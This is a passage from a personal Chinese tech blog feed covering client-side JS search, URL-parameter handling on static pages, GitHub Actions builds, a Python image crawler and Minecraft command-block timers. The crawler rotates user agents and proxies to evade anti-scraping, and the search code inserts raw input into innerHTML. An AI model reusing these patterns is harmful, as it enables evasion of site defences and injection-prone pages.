console.log('文章排序:'+targetname[j]) for (k = 0; k < obj.articles.length; k++) { if (obj.articles[k]['title'] == targetname[j]) { // 确认选区 textorder = obj.articles[k]['text'].indexOf(input.value) -15; while (textorder < 0) { textorder++ } resultfortext = '<h4><a href="'+obj.articles[k]["path"]+'" class="resulttitle">'+obj.articles[k]['title']+'</a></h4><em>-'+targetscorecache[i]+'个结果</em><p class="showbox">...'+obj.articles[k]['text'].substring(textorder, textorder+100).replace(new RegExp(input.value, 'g'), '<mark>'+input.value+'</mark>')+'</p>' textsearchresult = textsearchresult + '<hr>' + resultfortext; } } } } } // 无效结果安排 if (resultcount !== obj.articles.length) { if (resultcount == 0) { result.innerHTML = '<i>"'+input.value+'"</i><hr><p align="center">没有找到结果</p>' } } // 整合 result.innerHTML = result.innerHTML.substring(0, result.innerHTML.length-4)+textsearchresult.substring(0, textsearchresult.length-4)+'<hr><a href="https://github.com/ravelloh/RPageSearch" class="tr">Search powered by RavelloH\'s RPageSearch</a>' } 当然，上述代码比复杂，接下来我会分步来说。 代码分析 前3行没什么好说的，找到对应的元素，方便后期处理。 第5行从生成的json内获取数据，之后从第六行开始是主函数，搭配html表单使用，效果是当输入时实时搜索。 7-10行判断输入框是否为空，若空替换为默认提示词。 12-21行遍历json中存储的标题，查找是否有相关字词，若有，为resultcount+1，并将完整标题加入到列表resulttitlecache中 23-34行用于展示搜索结果，条件是resultcount不为0（要能找得到结果才继续，节省运算量）且不为json中文章总数（若输入一些字符后全部删除，默认输入了""，所有文章都会有反馈。），里面是两个遍历组合，第一个遍历resulttitlecache中的有结果的标题，第二个遍历总数据，搜索到契合后即可确认总数据的路径、时间、正文、标题信息，然后整合存储到resultstr中。这样因为我们在python生成数据时就是按时间顺序排列的，在这里遍历也是时间最近的结果优先。同时，第一层遍历将搜索到的resultstr中的信息整合到html中展示结果的result元素(一个id为resultlist的div)中。这里也用js替换高亮了信息里面的关键字，会给匹配的字符添加到一个mark标签内（默认黄底白字，可以用css改，比如我的博客就改成了蓝底另外加了个圆角），另外也会截取正文前100字符用于展示，但是因为字符宽度不一显示起来不整齐，要解决可以用css限制行数，css我会放在文章下面。 36-43行与12-21行相似，将搜索匹配的结果存储在resulttextcache中，不在赘述。 45-57行也类似于23-34行，为两个嵌套的遍历，不同的是这个不写入，而是记录搜索结果中含关键词的总数，方便后续排序。具体做法是创建两个列表targetname和targetscore，targetname记录resulttextcache中的正文内容，targetscore记录对应含关键词的数量。这两个是一一对应的关系，比如targetname的第二项所含的关键词总数就等于targetscore第二项记录的数字。 59-84行花了大功夫排序，首先创建一个targetscore的备份targetscorecache，但是要深拷贝*关乎js数组知识，若只是简单的var a=b则a b共享存储位置，换句话说就是a变b也变，对一维数组可以简单的使用a=b.concat([])来解决，之后以数组sort方式排序，此时targetscorecache为降序排列，targetscore保持原顺序不变，之后套三层遍历（应该还能继续优化，但我懒得做了，又不是不能用，性能影响也不大）前两层嵌套和之前搜索匹配的23-34、45-57相同，不过这次匹配的是targetscorecache与targetscore，之后再从总数据到json种找到正文匹配的文章，获取到对应的path、title、time和text，然后是类似于23-34到写入过程，这里值得注意有三点，一是这次高亮的是text中的结果，2是这里也会用上作为排序依据的targetscore，在标题下方展示相应的结果数（见最上方用于展示的图片），三是这里生成的html代码不直接写入而是存储到变量textsearchresult中，方便最后整合的时候删掉多余的hr标签。 86-91给上面接底，如果啥也没找到就替换为相应的文本。 最后92-93用来整合、合并标题搜索与正文搜索的内容，顺便加上个powered by的后缀，这里你也可以替换为你自己的文字，或者干脆连前面的hr标签也一起删掉，但我还是希望能留下个注释标明出处。 上述就是js进行本地运算的过程，至于若想达到和我博客相同的效果，css是必不可少的，这里简单罗列一下css及相关的js。 <!-- CSS --> form.searchbox input[type=text] { color: #c6c9ce; height: 30px; padding: 5px; font-size: 12px; float: left; width: 80%; background: #000000; border: 1px solid #1e1e1e; border-radius: 10px 0px 0px 10px; } form.searchbox button { height: 30px; float: left; width: 20%; padding: 5px; background: #1e1e1e; color: white; font-size: 12px; border: none; cursor: pointer; border: 1px solid #1e1e1e; border-radius: 0px 10px 10px 0px; text-align: center; line-height: 10px; margin: auto; } form.searchbox button:hover { background: #0b7dda; transition: background 0.2s; } form.searchbox::after { content: ""; clear: both; display: table; } .resultlist { top: -20px; height: 0; width: 100%; transition: height 0.4s; background: #000000; color: #c6c9ce; } .resultlist#active { border-radius: 10px; border: 1px solid #1e1e1e; height: 40%; } .resultlist * { margin: 2px; } .resulttitle { color: #ffffff; font-size: 1em; } #info { opacity: 1; transition: opacity 0.4s; } #hidden { opacity: 0; } .fc { text-align: center; } .title { max-width: 45%; } .tr { text-align: right } mark { background-color: #0b7dda; border-radius: 4px; color: #fff; margin: 0; } .showbox { display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 2; overflow: hidden; margin: 2px !important } // JS 添加到刚才所有JS的最上方 function check() { return false; } function maxfor(arr) { var len = arr.length; var max = -Infinity; while (len--) { if (arr[len] > max) { max = arr[len]; } } return max; } // 下面的和刚才的代码有部分重复，替换就行 let input = document.querySelector("input[type='text']"); let result = document.getElementById('resultlist') let infos = document.getElementById('info') let button = document.getElementById('searchbutton') input.addEventListener("focus", e => { result.style.height = '40%' result.style.overflow = 'auto' result.style.padding = '3px' infos.id = 'hidden' }) input.addEventListener("blur", e => { result.style.height = '0' result.style.overflow = 'hidden' result.style.padding = '0' infos.id = 'info' }) // 下方应为obj的定义 后言 上述就是目前这个版本搜索的实现，理论上来说这个和前面一篇文章一样，内容都是关于伪动态的，因为搜索这个功能到我写这篇文章为止，都是先存数据库，然后在搜索时拿去数据库比对，之后返回结果，像我这样把搜索过程全搬到用户端的估计全互联网我还是第一人。不过这样也有利有弊，最大的利是节省了服务器，而弊端就是搜索速度依靠用户端设备算力，另外就是在内容太多时需要先将json下载到本地才能搜索（这是必要的，但是可以通过预加载等方式提前这个过程加快） 做了这几篇文章，可以简单归纳伪动态：用其他脚本处理整合数据，前端用js处理。这里整合的载体是json，前面的EverydayNews载体是固定的文件夹结构，PSGameSpider则是混合，将数据直接写入定时更新生成的html的js部分数组里，读取则是靠固定文件夹结构。 说回主角，我把它在Github立了个项，放在Github@RavelloH/RPageSearch中，现在没有时间不会再去更新它，但是以后(也可能是很久以后)会陆续升级一下，加入模糊搜索等功能。 ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[论静态页中伪动态的实现]]></title>
        <id>/articles/20220708/</id>
        <link href="https://ravelloh.top/articles/20220708/"/>
        <updated>2022-07-08T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ *注:此文章Javascript代码框可以“运行”以查看效果。为了充分展示所有功能，建议先点击此处补充全链接内容。 前言 最近半年里，我先后完成了PSGameSpider与EverydayNews 这两个项目，它们都是基于GithubPages的静态页，但其中都多多少少可以实现动态站的部分功能，如识别网址后的？xxx=xxx并作出反馈（EverydayNews），或者动态根据Github中的仓库内容渲染页面（PSGameSpider）。 不过，这实质上也并没有改变这作为静态站的本质，因为这不符合动态站“个性化为不同用户展示页面”的特点。 实际上，“伪动态”这个名词是类比“伪静态”而产生的，但不同于伪静态中可以用服务器正则判断并生成网页，静态站中想要实现部分动态站的效果就只能靠在用户的设备上执行脚本，并使用已有的静态资源做出反馈。 下面是其中一部分功能的实现效果及方法: 效果 链接识别 页面自动生成详见Github:PSGameSpider。 实现方法 链接识别 JavaScript中自带有识别当前页面的链接的方法window.location.search，可以用来识别当前页面的链接。 local.search可以识别链接中带?及其后的内容。除此之外，还有下列类似的获取页面url的方法： *注:下列列表中的内容可以点击执行以查看效果。为了充分展示所有功能，建议先点击此处补充全链接内容。 window.location.href - 识别整个链接 window.location.origin - 识别协议+域名 window.location.protocol - 识别协议 window.location.host - 识别域名+端口*当端口为默认值80时返回空字符串 window.location.hostname - 识别域名 window.location.port - 识别端口*当端口为默认值80时返回空字符串 window.location.pathname - 识别页面路径 window.location.hash - 识别#及其内容 window.location.search - 识别？及其内容 这里可以运用此方法实现？xxx=xxx的识别： // JavaScript var local = window.location.search; if (local.substring(0, 6) == '?text=') { var text = local.substring(6); alert(text); } else { alert('没有text参数'); } >>运行<< function textalert() { var local = window.location.search; if (local.substring(0, 6) == '?text=') { var text = local.substring(6); alert(text); } else { alert("没有text参数"); } } 上述代码中实现了一个识别当前页面的链接的方法，如果识别的链接中包含了一个参数，这个参数的名字是text，那么就会弹出一个提示框，提示这个参数的值。 但是此方法也有局限性，就是只能识别一个参数，如果链接中有多个参数，那么就会带着后面的参数一起输出。 为了解决这个问题，我们可以从参数的分割符&下手，当存在&时截断数据: // JavaScript var local = window.location.search; if (local.substring(0, 6) == '?text=') { var text = local.substring(6); var text2 = text.substring(0, text.indexOf('&')); alert(text2); } else { alert("没有text参数"); } >>运行<< function textalert2() { var local = window.location.search; if (local.substring(0, 6) == '?text=') { var text = local.substring(6); var text2 = text.substring(0, text.indexOf('&')); alert(text2); } else { alert("没有text参数"); } } 不过这样还不够优雅，如果我们需要的参数没有排在第一位，那么我们可以使用正则表达式来实现： // JavaScript var local = window.location.search; var reg = /text=(.*)/; var result = reg.exec(local); if (result != null) { alert(result[1]); } else { alert("没有text参数"); } >>运行<< function textalert3() { var local = window.location.search; var reg = /text=(.*)/; var result = reg.exec(local); if (result != null) { alert(result[1]); } else { alert("没有text参数"); } } 通过对上面的代码的进一步加工，我们就能做到分别提取参数的值，并且可以解决多个参数的问题。 下面是一个完整的例子： function textalert4() { //判断有没有？ var local = window.location.search; if (local.substring(0, 1) == '?') { //如果只有一个参数，那么直接弹出提示框 if (local.substring(1).indexOf('&') == -1) { alert(local.substring(1)); } else { //遍历替换所有&为? var local = window.location.search; var reg = /&/g; var result = reg.exec(local); if (result != null) { local2 = local.replace(reg, "?"); } //删除相邻的? var reg2 = /\?{2,}/; var result2 = reg2.exec(local2); if (result2 != null) { var local3 = local2.replace(/\?{2,}/, "?"); } else { var local3 = local2; } //在最后加入一个?,方便截取 var local4 = local3 + "?"; //以?为分割符，循环遍历截取每一个参数并存储在数组中 var reg3 = /\?/; var result3 = reg3.exec(local4); var arr = []; while (result3 != null) { var local5 = local4.substring(0, local4.indexOf("?")); arr.push(local5); local4 = local4.substring(local4.indexOf("?") + 1); result3 = reg3.exec(local4); } //删除arr中的空元素 var reg4 = /^\s*$/; for (var i = 0; i < arr.length; i++) { if (reg4.exec(arr[i]) != null) { arr.splice(i, 1); i--; } } //遍历arr数组，并输出=前面的值与=后面的值 for (var i = 0; i < arr.length; i++) { var reg5 = /=/; var result5 = reg5.exec(arr[i]); if (result5 != null) { var local6 = arr[i].substring(0, arr[i].indexOf("=")); var local7 = arr[i].substring(arr[i].indexOf("=") + 1); alert("参数" + local6 + "的值为" + local7); } } } } else { alert("没有参数"); } } // JavaScript //判断有没有"？" var local = window.location.search; if (local.substring(0, 1) == '?') { //如果只有一个参数，那么直接弹出提示框 if (local.substring(1).indexOf('&') == -1) { alert(local.substring(1)); } else { //遍历替换所有&为? var local = window.location.search; var reg = /&/g; var result = reg.exec(local); if (result != null) { local2 = local.replace(reg, "?"); } //删除相邻的? var reg2 = /\?{2,}/; var result2 = reg2.exec(local2); if (result2 != null) { var local3 = local2.replace(/\?{2,}/, "?"); } else { var local3 = local2; //在最后加入一个?,方便截取 var local4 = local3 + "?"; console.log(local4); //以?为分割符，循环遍历截取每一个参数并存储在数组中 var reg3 = /\?/; var result3 = reg3.exec(local4); var arr = []; while (result3 != null) { var local5 = local4.substring(0, local4.indexOf("?")); arr.push(local5); local4 = local4.substring(local4.indexOf("?") + 1); result3 = reg3.exec(local4); } //删除arr中的空元素 var reg4 = /^\s*$/; for (var i = 0; i < arr.length; i++) { if (reg4.exec(arr[i]) != null) { arr.splice(i, 1); i--; } } //遍历arr数组，并输出=前面的值与=后面的值 for (var i = 0; i < arr.length; i++) { var reg5 = /=/; var result5 = reg5.exec(arr[i]); if (result5 != null) { var local6 = arr[i].substring(0, arr[i].indexOf("=")); var local7 = arr[i].substring(arr[i].indexOf("=") + 1); alert("参数" + local6 + "的值为" + local7); } } } } else { alert("没有参数"); } >>运行<< 页面自动构建 当然，自动构建代码需要平台支持，这就不可避免的需要用到服务器。 但是在本地无服务器的情况下，也可以上云，比如Github的Actions以及其他类似的服务。 下面以Github Actions为例，演示如何使用Github Actions来自动构建页面： Github Actions 简而言之，Github Actions就是一个云端的持续集成服务器。想要使用Github，只需要将相应代码传至Github仓库，在其中配置Actions即可。 Actions的配置也很简单，只需在仓库内新建.github/workflows/main.yml文件即可。 在此yml文件中，可以设置触发方式（如定时、每次提交、每次修改），以及触发条件（如提交的文件、提交的分支）。 另外要执行的代码内容，依选择的平台的命令行格式来执行即可。比如要执行一Python脚本，可以在yml文件中写： jobs: build: runs-on: ubuntu-latest #设置运行环境 steps: - name: Checkout uses: actions/checkout@v2 - name: 'Git set' run: | git init git pull - name: 'Set up Python' uses: actions/setup-python@v1 with: python-version: 3.7 #v3 - name: 'Install requirements' run: | pip install wget pip install bs4 pip install urllib3 #安装依赖 - name: 'Working' run: python update.py #运行主程序 其余有关Actions的内容不再赘述，详见Github Actions Docs。 使用Github Actions 因为Github Actions是一个云端的持续集成服务器，所以可以在Github上配置Actions，然后在Github上提交代码，就可以自动构建页面。 但这并不能达到自动构建页面的目的。想要自动部署，目前有两种方式： 1. Github Actions + 爬虫 这个方法能实现全自动的内容抓取、分析、部署。下面以Python为例，讲讲大致的过程： 首先需要明确要爬取的内容类型，如图片、文字、视频等。针对这些，如果网站需要展示相应的内容，那么就有使用原内容\下载至Github后展示两种思路。 展示原内容的，即爬虫只爬取资源链接（或文字），然后写入页面； 下载至Github，即爬虫爬取链接后下载内容，并使用Git将下载的内容提交至仓库，然后使用GithubPages展示。 下载至Github的爬虫 前者适合于网站的内容比较简单的，后者适合于网站的内容比较复杂的，并且前者不能存档资源，后者可以存档并备份资源 如只是简单的复制内容，如爬取相应网站的css、js、html等并部署到自身以绕过封锁，或者是类似于新闻等的信息展示，那么可以使用第一种方式； 如果在网站中需要存档资源方便查询，或者是源网站为非静态导致链接更换频繁，那么可以使用第二种方式。 不过两者都有一定的局限性，例如前者不下载资源可能在网站结构改变或者动态站内容更新时，无法自动更新，而后者可能会导致资源冗余等问题。 所以最好的方法是两者结合，并以不同资源类型而分情况使用。 比如下载图像、文件等资源，并将相应文字资源直接写入html，然后配套修改链接即可。 例我的项目为Github:RavelloH/PSGameSpider，其中包含了一个爬虫，用于爬取游戏资源。 此项目的Github Actions配置如下： # YAML name: update on: schedule: - cron: '30 5/12 * * *' #每日更新 watch: types: [started] workflow_dispatch: jobs: build: runs-on: ubuntu-latest #运行环境 steps: - name: Checkout uses: actions/checkout@v2 - name: 'Git set' run: | git init git pull - name: 'Set up Python' uses: actions/setup-python@v1 with: python-version: 3.7 #v3 - name: 'Install requirements' run: | pip install wget pip install bs4 pip install urllib3 #安装依赖 - name: 'Working' run: python update.py #运行主程序 - name: 'Page' run: python webpage.py #运行主程序 - name: 'EnglishWorking' run: python en-update.py #运行主程序 - name: 'EnPage' run: python en-webpage.py #运行主程序 - name: TOC uses: technote-space/toc-generator@v4 - name: Record time run: echo `date` > date.log - name: Commit files run: | git diff git config --local user.email "hyh20060327@qq.com" git config --local user.name "RavelloH" git add -A git commit -m "`date '+%Y-%m-%d %H:%M:%S'`" || exit #动态提交信息 git status git push -f env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 上述内容的逻辑是定时\STAR时激活爬虫，先下载资源，后通过python中的os.listdir()获取本地文件信息，后通过f.write()写入到HTML中。 另外，也可以使用另一种方法: 爬虫爬取到资源后，前端通过JavaScript将固定命名的资源文件引入，这样也能实现资源的动态更新。 不过这对资源形式的要求较高，要求每天只能有固定数（或者换句话说，资源的数目是可预判的）的资源类型。 使用这种方法的项目详见EverydayNews 前端JS代码实现 API + 前端即时渲染 这部分没什么好说的，看具体API返回的格式就行。 返回text的就直接 document.write()*外联拖慢加载速度或者.innerHTML()写入即可； 返回json的就需要使用JSON.parse()解析，然后再写入即可。（当然要是格式稳定，也可以切分字符串） 返回图片的也可以直接img引入即可，但是要注意图片的格式，要是png的话，要加上data:image/png;base64,。 这部分最难的是找API，使用起来也很方便，看具体文档就行。 ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Python实现网络爬虫]]></title>
        <id>/articles/20220323/</id>
        <link href="https://ravelloh.top/articles/20220323/"/>
        <updated>2022-03-23T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 前言 最近在参与一个数据收集的项目，需要大量获取图像及链接等，用人力显然是完成不过来了， 于是索性就做个爬虫，一劳永逸了。 这里因为项目比较小，对效率要求不大，就选择了使用Python而不是C语言。 (也因为Python用起来更省事) 本文所含代码可直接跳转#代码查看 效果 效果如上图，即输入网页链接，自动提取所含图片链接， 同时自动转化相对路径为绝对路径，方便下载。 最后每行一个print出来，方便统一存储/下载。 实现方式 Python在爬虫方面已经十分成熟，这里引用第三方库BeautifulSoup与urllib，若无这些库请下载: pip install bs4 pip install urllib *命令行执行即可 依赖库准备完后，引用： from urllib.request import urlopen,build_opener,ProxyHandler from bs4 import BeautifulSoup as bf from urllib import request import random 此处引用random以及build_opener与ProxyHandler是为了后续反爬， (毕竟默认UA是Python.Urllib) 接着配置UA池与IP代理池，防止被反爬(若项目规模较小可忽略此步) # UA user_agent_list = [ "Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1", "Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)", "Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11", "Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11", "Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)", "Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;SE2.XMetaSr1.0;SE2.XMetaSr1.0;.NETCLR2.0.50727;SE2.XMetaSr1.0)" ] # 随机UA headers ={ 'User-Agent':random.choice(user_agent_list) ## 随机抽取UA } ip_list=[ '125.120.62.26', ##IP池 '66.249.93.118' ] # IP ip={ 'http':random.choice(ip_list) ##随机抽取IP } link = input("在此输入网址:http://") htmlurl = "https://"+str(link) #链接整合，若input中输入了带http头的链接可忽略此行 req = request.Request(htmlurl,headers=headers) #请求整合 其中，ip_list推荐使用Github@jhao104/proxy_pool开源的IP代理池。*代码中所列IP均为演示作用，若需应用请自行设置 在此就完成了UA与IP的随机分配，反爬基本完成 不过反爬归反爬，也请自觉遵守robot协议，合理利用爬虫 下一步，发出请求： # 用ProxyHandler创建代理ip对象 pro_han = ProxyHandler(ip) # 使用build_opener替代urlopen()创建一个对象 opener = build_opener(pro_han) # 发送请求 res = opener.open(req) 到这里为止，整个请求结束，之后用BeautifulSoup解析: *下面已用bs代指beautifulsoup obj = bf(res.read(),'html.parser') #解析html title = str(obj.head.title) #获取标题 print("站点标题:",title,"正在查找图片") pic_info = obj.find_all('img') #查询img标签 这里也给出不含反爬的请求： (基本同上，唯一的区别是直接用urlopen打开链接) html = urlopen("https://"+link) obj = bs(html.read(),'html.parser') #解析html title = str(obj.head.title) #获取标题 print("站点标题:",title,"正在查找图片") pic_info = obj.find_all('img') #查询img标签 到这里我们已经成功将网页中所含的所有img标签以列表形式存储在了变量pic_info中， 接下来遍历输出即可： j = 0 #配置遍历 for i in pic_info: j += 1 pic = str(i['src']) #转为字符串，方便查询 if "http" not in pic: #检测http头 if "data" in pic: #检测是否为DataURIScheme continue else: if "//" in pic: #格式补全 print("http:"+pic) else: if pic[0] == "/": #适配相对路径 print("http://"+link+pic) else: print("http://"+link+"/"+pic) else: print(pic) #直接print绝对路径 上图套了四个if-else，作用分别是检测是否有http头、是否为内嵌base64图片、是否以//简写路径、是否使用相对路径， 到这里为止，整个程序就结束了 整个示例程序可分为引用-配置-请求-分析-输出5个部分， 除了爬取图片，也可将上面的pic_info = obj.find_all('img')改成其他标签， 比如改成meta可爬取简介，也可在特定站点内通过zaifind_all内添加对应的class(class_="xxx")及id(id_="xxx")来获取对应标签内的信息， 实现更多功能。 代码 完整版 from urllib.request import urlopen,build_opener,ProxyHandler from bs4 import BeautifulSoup as bf from urllib import request import random # UA user_agent_list = [ "Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:2.0.1)Gecko/20100101Firefox/4.0.1", "Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1)", "Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11", "Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11", "Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1)", "Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;Trident/4.0;SE2.XMetaSr1.0;SE2.XMetaSr1.0;.NETCLR2.0.50727;SE2.XMetaSr1.0)" ] # 随机UA headers ={ 'User-Agent':random.choice(user_agent_list) } ip_list=[ '209.97.171.128', '114.250.25.19', '125.120.62.26', '66.249.93.118', '1.202.113.240', ] # IP ip={ 'http':random.choice(ip_list) } link = input("在此输入网址:http://") htmlurl = "https://"+str(link) req = request.Request(htmlurl,headers=headers) # 创建代理ip对象 pro_han = ProxyHandler(ip) # 使用build_opener创建一个对象 opener = build_opener(pro_han) # 发送请求 res = opener.open(req) obj = bf(res.read(),'html.parser') #解析html title = str(obj.head.title) print("站点标题:",title,"正在查找图片") pic_info = obj.find_all('img') j = 0 #配置遍历 for i in pic_info: j += 1 pic = str(i['src']) if "http" not in pic: if "data" in pic: continue else: if "//" in pic: print("http:"+pic) else: if pic[0] == "/": print("http://"+link+pic) else: print("http://"+link+"/"+pic) else: print(pic) 基础版 from urllib.request import urlopen from bs4 import BeautifulSoup as bs link = input("在此输入网址:http://") html = urlopen("https://"+link) obj = bs(html.read(),'html.parser') #解析html title = str(obj.head.title) print("站点标题:",title,"正在查找图片") pic_info = obj.find_all('img') j = 0 #配置遍历 for i in pic_info: j += 1 pic = str(i['src']) if "http" not in pic: if "data" in pic: continue else: if "//" in pic: print("http:"+pic) else: if pic[0] == "/": print("http://"+link+pic) else: print("http://"+link+"/"+pic) else: print(pic) 下载 此文章共含2个附件，分别对应 基础版 与 完整版 。 imgspider.py - 0.73kb 预览 | 下载 imgspider-pro.py - 1.76kb 预览 | 下载 ]]></content>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[JS递归遍历伪数组]]></title>
        <id>/articles/20220206/</id>
        <link href="https://ravelloh.top/articles/20220206/"/>
        <updated>2022-02-06T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 前言 最近在用getElementsByTagName获取标签内容时，发现与getElementById/ClassName等不同， 直接document.getElementsByTagName('').id修改页面中所有标签的id时没有反应... console.log输出一下，发现输出的是[li,li,li,li,li]这种形式的伪数组(集合) 原理 这里既然是以集合的方式输出，就可以用逐项穷举的方式将其中的项挨个执行。 首先储存这个集合:*这里以li为例 var lis = document.getElementsByTagName('li') 然后用for循环递归: for(var i = 0; i < lis.length; i ++){ console.log(lis[i])} 这里直接输出了，在这个时候就可以用document.等 应用 给页面内所有span加入加载特效： /* CSS */ span { position: relative; animation-name: startloadingspan; animation-duration: 0.8s; } @keyframes startloadingspan { 0% { opacity: 0; } 100% { opacity: 1; } } span#active { position: relative; animation-name: endloadingspan; animation-duration: 0.8s animation-fill-mode: forwards; } @keyframes endloadingspan { 0% { opacity: 1; } 100% { opacity: 0; } } //JavaScript window.onbeforeunload = function (e) { document.getElementById("text").id = "active"; var spans = document.getElementsByTagName('span'); for(var i = 0;i < spans.length;i ++){ (spans[i]).id = "active";} } 后言 最近忙着升级主题，但是确实没有时间...这坑要慢慢填 这是2022的第一篇文章，但估计之后很长一段时间内也不会更多少博客，可能这也是2022的最后一篇文章了吧 新年快乐。 ]]></content>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Minecraft命令实现在线统计]]></title>
        <id>/articles/20210719/</id>
        <link href="https://ravelloh.top/articles/20210719/"/>
        <updated>2021-07-19T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 注:本文应用于1.13+ 效果 实现方式 首先要实现在线时间统计，需要先定义时间。 所以在这里 需要先创建几个稍后要用到的计分板： /scoreboard objectives add timetick dummy /scoreboard objectives add times dummy /scoreboard objectives add timem dummy /scoreboard objectives add timeh dummy /scoreboard objectives add timed dummy 顺次显示的是 秒-分-时-天。 计时器的思路是这样的： 使用循环命令方块为timetick加分，则每秒可以增加20（每秒命令方块运行20次） 当timetick为20时，为times加1并设置timetick为0。 当times为60时，为timem加1并设置times为0。 当timem为60时，为timeh加1并设置timem为0。 ...以此类推。 所以在这里 需要使用命令方块组+目标选择器进行运算: 循环: scoreboard players add @a timetick 1 连锁: scoreboard players add @a[scores={timetick=20..}] times 1 连锁: scoreboard players set @a[scores={timetick=20..}] timetick 0 连锁: scoreboard players add @a[scores={times=60..}] timem 1 连锁: scoreboard players set @a[scores={times=60..}] times 0 连锁: scoreboard players add @a[scores={timem=60..}] timeh 1 连锁: scoreboard players set @a[scores={timem=60..}] timem 0 连锁: scoreboard players add @a[scores={timeh=24..}] timed 1 连锁: scoreboard players set @a[scores={timeh=24..}] timeh 0 最后 再加一个title用于显示即可 循环： execute as @a at @s run title @p actionbar [{"text":"在线时间:","color":"green","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timed","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"天","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timeh","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"小时","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timem","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"分","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"times","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"秒","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false}] （考虑到多人游戏的情况 这里添加了一个execute用于保证显示正确的对象） 当我们搭建好全部命令方块并运行后，不难发现虽然计时器正常，但却没有显示值为0的项目: 这是因为未被赋值的计分板项目默认不显示，需要手动设置为0： /scoreboard players set @p times 0 /scoreboard players set @p timem 0 /scoreboard players set @p timeh 0 /scoreboard players set @p timed 0 之后即可正常使用。 命令 /scoreboard objectives add timetick dummy /scoreboard objectives add times dummy /scoreboard objectives add timem dummy /scoreboard objectives add timeh dummy /scoreboard objectives add timed dummy /scoreboard players set @p times 0 /scoreboard players set @p timem 0 /scoreboard players set @p timeh 0 /scoreboard players set @p timed 0 循环: scoreboard players add @a timetick 1 连锁: scoreboard players add @a[scores={timetick=20..}] times 1 连锁: scoreboard players set @a[scores={timetick=20..}] timetick 0 连锁: scoreboard players add @a[scores={times=60..}] timem 1 连锁: scoreboard players add @a[scores={timem=60..}] timeh 1 连锁: scoreboard players set @a[scores={timem=60..}] timem 0 连锁: scoreboard players add @a[scores={timeh=24..}] timed 1 连锁: scoreboard players set @a[scores={timeh=24..}] timeh 0 循环: execute as @a at @s run title @p actionbar [{"text":"在线时间:","color":"green","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timed","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"天","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timeh","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"小时","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"timem","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"分","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"score":{"objective":"times","name":"@p"},"color":"gray","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false},{"text":"秒","color":"gold","bold":false,"italic":false,"underlined":false,"strikethrough":false,"obfuscated":false}] OOC /summon falling_block ~ ~1.5 ~ {Time:1,BlockState:{Name:"minecraft:redstone_block"},Motion:[0d,-1d,0d],Passengers:[{id:falling_block,Time:1,BlockState:{Name:"minecraft:activator_rail"},Passengers:[{id:command_block_minecart,Command:"/data merge block ~ ~-2 ~ {auto:0b,Command:\"\"}"},{id:command_block_minecart,Command:"/scoreboard objectives add timetick dummy\n/scoreboard objectives add times dummy\n/scoreboard objectives add timem dummy\n/scoreboard objectives add timeh dummy\n/scoreboard objectives add timed dummy\n/scoreboard players set @p times 0 \n/scoreboard players set @p timem 0 \n/scoreboard players set @p timeh 0 \n/scoreboard players set @p timed 0 \nscoreboard players add @a timetick 1\nscoreboard players add @a[scores={timetick=20..}] times 1 \nscoreboard players set @a[scores={timetick=20..}] timetick 0 \nscoreboard players add @a[scores={times=60..}] timem 1\nscoreboard players add @a[scores={timem=60..}] timeh 1 \nscoreboard players set @a[scores={timem=60..}] timem 0 \nscoreboard players add @a[scores={timeh=24..}] timed 1 \nscoreboard players set @a[scores={timeh=24..}] timeh 0 \nexecute as @a at @s run title @p actionbar 